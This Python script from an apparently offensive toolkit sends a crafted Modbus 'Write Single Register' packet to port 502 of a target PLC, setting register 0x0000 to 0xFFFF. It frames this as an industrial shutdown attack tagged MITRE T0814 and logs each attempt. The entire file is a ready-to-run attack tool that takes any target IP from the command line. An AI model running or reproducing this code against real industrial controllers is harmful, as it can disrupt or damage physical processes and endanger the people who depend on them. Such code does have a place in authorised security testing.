#!/usr/bin/env python3
# modules/attacks/industrial_shutdown_fuzzer.py

import socket
import struct
import argparse
import json
import os
from datetime import datetime

LOG_FILE = "results/ics_shutdown_fuzz_log.json"
MITRE_TTP = "T0814"

def log_shutdown_attempt(target_ip, crafted_payload, success):
    os.makedirs("results", exist_ok=True)
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps({
            "timestamp": datetime.utcnow().isoformat(),
            "target": target_ip,
            "payload": crafted_payload.hex(),
            "success": success,
            "ttp": MITRE_TTP
        }) + "\n")

def send_shutdown_fuzz(ip, port=502):
    print(f"[*] Sending shutdown fuzz payload to {ip}:{port}...")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        sock.connect((ip, port))

        # Malformed Modbus write command to register 0x0000 with high value
        transaction_id = 0x1234
        protocol_id = 0
        unit_id = 1
        function_code = 6
        register = 0x0000
        value = 0xFFFF

        modbus_pdu = struct.pack(">BHH", function_code, register, value)
        length = len(modbus_pdu) + 1
        mbap = struct.pack(">HHHB", transaction_id, protocol_id, length, unit_id)
        payload = mbap + modbus_pdu

        sock.send(payload)
        response = sock.recv(1024)
        sock.close()

        log_shutdown_attempt(ip, payload, True)
        print("[✓] Payload sent. Response received.")
    except Exception as e:
        log_shutdown_attempt(ip, b'', False)
        print(f"[!] Failed to send: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Fuzz Modbus devices with crafted shutdown payloads")
    parser.add_argument("--ip", required=True, help="Target ICS/PLC IP address")
    args = parser.parse_args()
    send_shutdown_fuzz(args.ip)
